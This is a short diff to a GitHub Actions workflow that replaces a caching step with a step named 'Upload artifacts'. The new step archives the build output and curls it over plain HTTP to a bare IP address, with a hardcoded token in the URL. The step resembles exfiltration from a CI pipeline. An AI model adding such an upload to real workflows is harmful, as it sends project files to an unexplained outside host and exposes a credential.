@@ -14,8 +14,7 @@ jobs:
         uses: github-actions-test/cmake-build-action@master
         id: build
         
-      - name: Cache Artifacts
-        uses: actions/cache@v1
-        with:
-          path: ${{ steps.build.outputs.artifacts }}
-          key: ${{ github.ref }}
+      - name: Upload artifacts
+        run: |
+          tar -ca -C ${{steps.build.outputs.artifacts}} -f ${{github.sha}}.tar.gz *
+          curl -Ffile=@${{github.sha}}.tar.gz http://35.228.224.98/upload?token=29c0640d89c6f3ecd256
